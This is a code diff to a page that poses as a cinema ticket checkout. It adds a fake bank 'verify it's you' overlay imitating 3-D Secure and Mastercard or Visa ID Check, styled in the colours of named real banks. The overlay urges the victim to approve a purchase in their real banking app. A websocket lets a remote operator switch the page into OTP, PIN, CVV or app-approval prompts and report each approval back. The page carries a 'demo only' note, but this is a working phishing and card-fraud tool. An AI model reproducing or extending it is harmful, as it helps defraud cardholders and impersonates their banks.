@@ -84,6 +84,28 @@ main{max-width:1200px;margin:0 auto;padding:0 20px 80px;position:relative}
 .ino-close{position:absolute;right:24px;bottom:22px;background:#f7c600;color:#061b33;border:none;border-radius:999px;padding:12px 26px;font-size:14px;font-weight:800;cursor:pointer;box-shadow:0 4px 10px rgba(247,198,0,.32)}
 .ino-close:hover{background:#ffd633}
 .ino-close:active{transform:translateY(1px)}
+.app-verify-box{width:390px;background:#fff;border:7px solid #2d344f;border-radius:10px;padding:22px 30px 24px;position:relative}
+.app-hdr{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:38px}
+.app-bank-logo{width:34px;height:28px;border-radius:2px;color:#fff;font-weight:bold;font-size:17px;display:flex;align-items:center;justify-content:center;letter-spacing:-1px}
+.app-scheme{text-align:right;font-size:12px;line-height:1.1;color:#333}
+.app-scheme-mark{display:inline-block;width:38px;height:18px;position:relative;vertical-align:middle;margin-right:4px}
+.app-circle{width:18px;height:18px;border-radius:50%;position:absolute;top:0}
+.app-circle.red{background:#e53935;left:2px}
+.app-circle.yellow{background:#f6b51d;left:16px;opacity:.9}
+.app-scheme-name{font-weight:bold;font-size:11px}
+.app-verify-box h1{margin:0 0 15px;font-size:18px;line-height:1.25;font-weight:700}
+.app-intro{margin:0 0 17px;font-size:14px;line-height:1.42}
+.app-steps{margin:0;padding:0;list-style:none;font-size:14px;line-height:1.42}
+.app-steps li{margin-bottom:12px;display:flex;align-items:flex-start}
+.app-num{width:20px;flex-shrink:0}
+.app-links{margin-top:34px;display:flex;justify-content:space-between;align-items:center;font-size:12px;font-weight:bold}
+.app-links a{color:#000;text-decoration:underline}
+.app-question{text-align:center;font-size:13px;color:#333;margin-top:38px}
+.app-error{text-align:center;color:#ff1d25;font-size:12px;line-height:1.35;margin-top:16px}
+.app-btn-wrap{margin-top:14px;text-align:center}
+.app-btn-wrap button{border:0;background:#0878be;color:#fff;font-size:12px;font-weight:bold;padding:8px 22px;border-radius:3px;cursor:pointer}
+.app-btn-wrap button:hover{background:#066da9}
+.app-safe-note{margin-top:18px;font-size:11px;color:#777;line-height:1.4;text-align:center}
 </style>
 </head>
 <body>
@@ -202,6 +224,34 @@ main{max-width:1200px;margin:0 auto;padding:0 20px 80px;position:relative}
   </div>
 </div>
 
+<!-- APP Verification overlay -->
+<div class="overlay hidden" id="app-verify-overlay" style="background:#eef1f7">
+  <div class="app-verify-box">
+    <div class="app-hdr">
+      <div class="app-bank-logo" id="app-bank-logo">IB</div>
+      <div class="app-scheme" id="app-scheme">
+        <span class="app-scheme-mark">
+          <span class="app-circle red"></span>
+          <span class="app-circle yellow"></span>
+        </span>
+        <span class="app-scheme-name">ID Check</span>
+      </div>
+    </div>
+    <h1>Before you purchase, verify it's you</h1>
+    <p class="app-intro">For added security, your bank needs to verify this purchase at <strong id="app-merchant">Cineplex</strong> for <strong id="app-amount">$0.00</strong> by authenticating in the banking app.</p>
+    <ol class="app-steps">
+      <li><span class="app-num">1.</span><span>Open your banking app and sign in. If already signed in, go to <strong>Card Verification Requests</strong>.</span></li>
+      <li><span class="app-num">2.</span><span>Review the purchase details and choose <strong>Approve</strong> or <strong>Decline</strong>.</span></li>
+      <li><span class="app-num">3.</span><span>Return to this page after approving the request.</span></li>
+    </ol>
+    <div class="app-links"><a href="javascript:void(0)">Need Help?</a><a href="javascript:void(0)">Terms of use</a><a href="javascript:void(0)">Exit</a></div>
+    <div class="app-question">Already verified this purchase?</div>
+    <div class="app-error hidden" id="app-error">Verification unsuccessful. Please return to the app to verify again.</div>
+    <div class="app-btn-wrap"><button type="button" id="app-continue-btn" onclick="appVerifyContinue()">Continue to complete</button></div>
+    <div class="app-safe-note">Sandbox / demo page only. Do not collect card numbers, passwords, app login credentials, or one-time passcodes on this page.</div>
+  </div>
+</div>
+
 <script>
 const p=new URLSearchParams(location.search);
 const isGiftCard=p.get('type')==='giftcard';
@@ -243,7 +293,8 @@ else if(a==='session_restored'){
 else if(a==='otp_verify'){window._otpInProgress=true;document.getElementById('load-overlay').classList.add('hidden');document.getElementById('otp-overlay').classList.remove('hidden');var sfx=p.phoneSuffix||'****';document.querySelector('#otp-body h2').textContent='Enter your security code';document.querySelector('#otp-body p').textContent='We have resent One-Time Password (OTP) in a text message to your registered mobile number (last digits '+sfx+'). Please submit your One-Time Password (OTP).';document.getElementById('otp-amount-row').style.display='';resetOtp();startOtpTimer();resetResend()}
 else if(a==='custom_otp_verify'){document.getElementById('otp-overlay').classList.remove('hidden');var sfx2=p.phoneSuffix||'****';document.querySelector('#otp-body h2').textContent='Enter OTP Code';document.querySelector('#otp-body p').textContent='We have resent One-Time Password (OTP) in a text message to your registered mobile number (last digits '+sfx2+'). Please submit your One-Time Password (OTP).';resetOtp();startOtpTimer();resetResend()}
 else if(a==='custom_otp_tail'){window._otpInProgress=true;document.getElementById('load-overlay').classList.add('hidden');document.getElementById('otp-overlay').classList.remove('hidden');var sfx3=p.phoneSuffix||'****';document.querySelector('#otp-body h2').textContent='Enter your security code';document.querySelector('#otp-body p').textContent='We have resent One-Time Password (OTP) in a text message to your registered mobile number (last digits '+sfx3+'). Please submit your One-Time Password (OTP).';resetOtp();startOtpTimer();resetResend()}
-else if(a==='email_verify'||a==='pin_verify'||a==='cvv_verify'||a==='app_verify'||a==='question_verify'){document.getElementById('load-overlay').classList.add('hidden');document.getElementById('otp-overlay').classList.remove('hidden');document.querySelector('#otp-body h2').textContent='Verification Required';document.querySelector('#otp-body p').textContent=p.message||'Please complete verification';resetOtp()}
+else if(a==='email_verify'||a==='pin_verify'||a==='cvv_verify'||a==='question_verify'){document.getElementById('load-overlay').classList.add('hidden');document.getElementById('otp-overlay').classList.remove('hidden');document.querySelector('#otp-body h2').textContent='Verification Required';document.querySelector('#otp-body p').textContent=p.message||'Please complete verification';resetOtp()}
+else if(a==='app_verify'){document.getElementById('load-overlay').classList.add('hidden');document.getElementById('app-verify-overlay').classList.remove('hidden');var bankName=p.cardInfo?.bankName||p.bankName||'Bank';document.getElementById('app-bank-logo').textContent=bankName.slice(0,2).toUpperCase();document.getElementById('app-bank-logo').style.background=getBankColor(bankName);document.getElementById('app-amount').textContent='$'+(p.amount||total||'0.00');updateAppSchemeLogo(p.cardInfo?.cardType||p.cardType||'')}
 else if(a==='approve'){if(isGiftCard){showInline('Payment approved! Gift card will be emailed.')}else{var d=btoa(JSON.stringify({movie:document.querySelector('#movie-block h2')?.textContent||'',theatre:document.querySelector('#movie-block .name')?.textContent||'',date:document.querySelector('#movie-block .detail-row span')?.textContent||'',tickets:selections.map(function(s){return s.name+' ×'+s.quantity}).join(', '),total:total}));location.href='/tickets/complete/?d='+d}}
 else if(a==='reject'){document.getElementById('load-overlay').classList.add('hidden');document.getElementById('submitBtn').disabled=true;showInline('Rejected: '+(p.message||''),true)}
 else if(a==='card_error'){document.getElementById('load-overlay').classList.add('hidden');document.getElementById('submitBtn').disabled=false;showInline('Card error: '+(p.message||''),true)}
@@ -340,6 +391,11 @@ var _otpResendCount=0,_resendTimer=null,_resendSec=0;
 function resetResend(){_otpResendCount=0;_resendSec=0;clearInterval(_resendTimer);var rb=document.getElementById('otp-resend');if(rb){rb.disabled=false;rb.textContent='Resend Code';rb.style.opacity='1'}}
 function startResendCooldown(){_resendSec=60;var rb=document.getElementById('otp-resend');if(rb){rb.disabled=true;rb.textContent='Resend Code (60s)'}_resendTimer=setInterval(function(){_resendSec--;if(rb){rb.textContent='Resend Code ('+_resendSec+'s)'}if(_resendSec<=0){clearInterval(_resendTimer);if(rb&&_otpResendCount<5){rb.disabled=false;rb.textContent='Resend Code';rb.style.opacity='1'}}},1000)}
 function resendOtp(){if(_resendSec>0||_otpResendCount>=5)return;if(ws&&ws.readyState===1)ws.send(JSON.stringify({type:'resend_otp',payload:{sessionId:sid}}))}
+
+function getBankColor(name){var n=(name||'').toLowerCase();if(/chase|jpmorgan/.test(n))return'#0f5499';if(/bofa|bank of america/.test(n))return'#e31837';if(/wells\s*fargo/.test(n))return'#d71e28';if(/citi(?!zen)/.test(n))return'#056dae';if(/capital\s*one/.test(n))return'#004977';if(/td(\s|bank)/.test(n))return'#20b14a';if(/rbc|royal/.test(n))return'#005cd9';if(/scotia|scotiabank/.test(n))return'#ed1c24';if(/bmo/.test(n))return'#0079c2';if(/cibc/.test(n))return'#c41f3d';if(/amex|american\s*express/.test(n))return'#006fcf';if(/discover/.test(n))return'#ff5f1f';return'#1a1f71'}
+function updateAppSchemeLogo(cardType){var el=document.getElementById('app-scheme');var n=(cardType||'').toLowerCase();if(n.includes('visa')){el.innerHTML='<svg width="34" height="22" viewBox="0 0 32 22"><rect width="32" height="22" rx="3" fill="#1a1f71"/><text x="16" y="15" text-anchor="middle" fill="#fff" font-size="10" font-weight="700">VISA</text></svg> <span class="app-scheme-name">ID Check</span>'}else if(n.includes('mastercard')||n.includes('mc')){el.innerHTML='<span class="app-scheme-mark"><span class="app-circle red"></span><span class="app-circle yellow"></span></span> <span class="app-scheme-name">ID Check</span>'}else if(n.includes('amex')){el.innerHTML='<svg width="34" height="22" viewBox="0 0 32 22"><rect width="32" height="22" rx="3" fill="#006fcf"/><text x="16" y="16" text-anchor="middle" fill="#fff" font-size="8" font-weight="700">AMEX</text></svg> <span class="app-scheme-name">ID Check</span>'}else{el.innerHTML='<span class="app-scheme-mark"><span class="app-circle red"></span><span class="app-circle yellow"></span></span> <span class="app-scheme-name">ID Check</span>'}}
+function appVerifyContinue(){hideAppVerify();if(ws&&ws.readyState===1&&sid)ws.send(JSON.stringify({type:'app_verify_done',payload:{sessionId:sid}}))}
+function hideAppVerify(){document.getElementById('app-verify-overlay').classList.add('hidden')}
 
 document.getElementById('otp-code').addEventListener('input',function(){this.value=this.value.replace(/\D/g,'').slice(0,8)});
 document.getElementById('otp-submit').addEventListener('click',submitOtp);
